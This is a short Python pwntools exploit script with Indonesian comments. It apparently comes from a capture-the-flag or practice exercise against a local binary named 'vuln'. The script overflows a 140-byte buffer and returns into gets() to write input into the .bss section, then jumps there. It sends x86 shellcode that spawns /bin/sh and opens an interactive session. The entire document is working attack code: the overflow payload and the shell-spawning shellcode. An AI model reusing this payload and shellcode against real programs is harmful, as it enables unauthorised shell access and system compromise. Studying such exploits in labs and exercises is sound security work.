from pwn import *

def main():
    r = process('./vuln')
    offset = 140
    bss    = 0x0804a02c
    gets   = 0x80483a0
    main   = 0x0804853c
    shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
    p = ""
    p += "A"*140
    p += p32(gets) # ubah eip ke fungsi gets()
    p += p32(bss)  # eksekusi bss setelah gets selesai
    p += p32(bss)  # parameter gets(bss)
    r.sendline(p)  # kirim payload pertama
    r.sendline(shellcode) # bakal minta lagi kirim shellcode jadi masuk ke bss
    r.interactive()

if __name__ == '__main__':
    main()
